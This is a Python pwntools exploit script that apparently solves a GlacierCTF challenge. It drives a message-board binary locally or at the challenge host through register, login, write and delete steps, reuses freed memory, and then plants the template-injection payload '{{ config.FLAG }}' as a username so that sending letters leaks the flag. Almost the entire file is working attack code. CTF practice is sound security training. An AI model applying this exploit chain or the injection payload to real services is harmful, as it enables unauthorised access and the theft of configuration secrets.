#!/bin/python3
from pwn import *

context.log_level = 'INFO'
#context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['terminator', '-u', '-e']
context.terminal = ['remotinator', 'vsplit', '-x']
context.arch = 'amd64'

######################################################################################

process_name = './main'
elf = context.binary = ELF(process_name)
#libc = ELF('./libc.so.6')

HOST = "challs.glacierctf.com"
PORT = 20303

######################################################################################

# breakrva [-h] [offset] [module]
# aslr [-h] [{off,on}]
gdb_script = f'''
    #set breakpoint pending on
    
    continue
    '''

######################################################################################

def connect():
    if args.REMOTE:
        print(f"[*] Connecting to {HOST} : {PORT}")
        p = remote(HOST, PORT, ssl=False)        
    elif args.GDB:
        print(f'[*] Debugging {elf.path}.')
        p = gdb.debug([elf.path], gdbscript=gdb_script, aslr=False)
    else:
        print(f'[*] Executing {elf.path}.')
        p = process([elf.path])
    return p

def register(name, password):
    p.sendlineafter(b'Exit', b'1')
    p.sendlineafter(b'username:', name.encode())
    p.sendlineafter(b'password:', password.encode())

def login(name, password):
    p.sendlineafter(b'Exit', b'2')
    p.sendlineafter(b'username:', name.encode())
    p.sendlineafter(b'password:', password.encode())

def write_msg(msg):
    p.sendlineafter(b'Logout', b'1')
    p.sendlineafter(b'content:', msg.encode())

def del_msg(id):
    p.sendlineafter(b'Logout', b'2')
    p.sendlineafter(b'delete:', str(id).encode())

def logout():
    p.sendlineafter(b'Logout', b'4')

def send_letters():
    p.sendlineafter(b'Logout', b'3')



######################################################################################

p = connect()

register("chals", "12345")
login("chals", "12345")

write_msg("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
del_msg(0)
logout()

register("{{ config.FLAG }}", "CCCC")

login("chals", "12345")
send_letters()

######################################################################################

p.interactive()